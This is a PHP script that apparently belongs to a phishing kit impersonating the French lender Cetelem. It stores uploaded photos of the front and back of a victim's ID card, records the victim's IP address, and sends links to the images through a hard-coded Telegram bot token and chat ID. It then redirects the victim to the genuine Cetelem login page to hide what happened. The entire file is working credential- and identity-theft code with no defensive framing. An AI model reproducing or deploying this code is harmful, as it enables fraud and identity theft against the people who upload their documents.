 
<?php
session_start();
$ip = $_SERVER["REMOTE_ADDR"];
$_SESSION['_IP_'] = $_SERVER["REMOTE_ADDR"];
date_default_timezone_set('Africa/Cairo');
$date = date('d/m/Y h:i:sa');
$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];
$config_token = "5759111738:AAHsW7K_NhXMJOk89TYWrwooJYYCsu8k1Xo";
$config_chat = "-995416692";

// Function to upload a file and return its link
function uploadFile($file, $uploadDirectory)
{
    $fileName = uniqid() . '_' . $file['name'];
    $targetPath = $uploadDirectory . $fileName;

    if (move_uploaded_file($file['tmp_name'], $targetPath)) {
        return $targetPath;
    } else {
        return false;
    }
}

// Check if files were uploaded successfully
if (!empty($_FILES['recto']['tmp_name']) && !empty($_FILES['verso']['tmp_name'])) {
    // Define the directory to upload images
    $uploadDirectory = 'uploads/';

    // Upload the images and get their links
    $rectoLink = uploadFile($_FILES['recto'], $uploadDirectory);
    $versoLink = uploadFile($_FILES['verso'], $uploadDirectory);

    if ($rectoLink && $versoLink) {
        // Images uploaded successfully
        // Now, you can send the links to Telegram
        $TELG = urlencode("<b>Cetelem ID card</b>\n" . $ip . "\n");
        $TELG .= urlencode("»<b> Recto</b> : http://srv201248.hoster-test.ru/b4d65f4g6e/z9e84f6s5d4/config/" . $rectoLink . "\n");
        $TELG .= urlencode("»<b> Verso</b> : http://srv201248.hoster-test.ru/b4d65f4g6e/z9e84f6s5d4/config/" . $versoLink . "\n");

        // Send the message to Telegram
        $telegramUrl = 'https://api.telegram.org/bot' . $config_token . '/sendMessage?chat_id=' . $config_chat . '&text=' . $TELG . '&parse_mode=html';
        file_get_contents($telegramUrl);

        header('Location: https://www.cetelem.fr/mga/sps/authsvc/policy/cetelemauthentication?operation=login'); // Redirect to success page
    } else {
        header('Location: ../id.php'); // Redirect back to the form with an error message
    }
} else {
    header('Location: ../id.php'); // Redirect back to the form with an error message
}
?>
